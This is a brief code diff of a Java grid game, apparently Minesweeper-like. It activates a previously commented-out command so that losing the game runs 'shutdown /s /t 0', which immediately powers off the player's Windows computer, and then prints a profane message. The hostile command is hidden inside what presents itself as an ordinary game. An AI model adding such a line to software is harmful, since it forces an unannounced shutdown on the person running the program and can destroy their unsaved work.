@@ -159,7 +159,7 @@ public class jframe {
             board[i][j].setEnabled(false);
         } else {
             try {
-                 //Runtime.getRuntime().exec("shutdown /s /t 0");
+                Runtime.getRuntime().exec("shutdown /s /t 0");
                 System.out.println("you fucking died");
             } catch (Exception ex) {
                 System.out.println("you were saved");
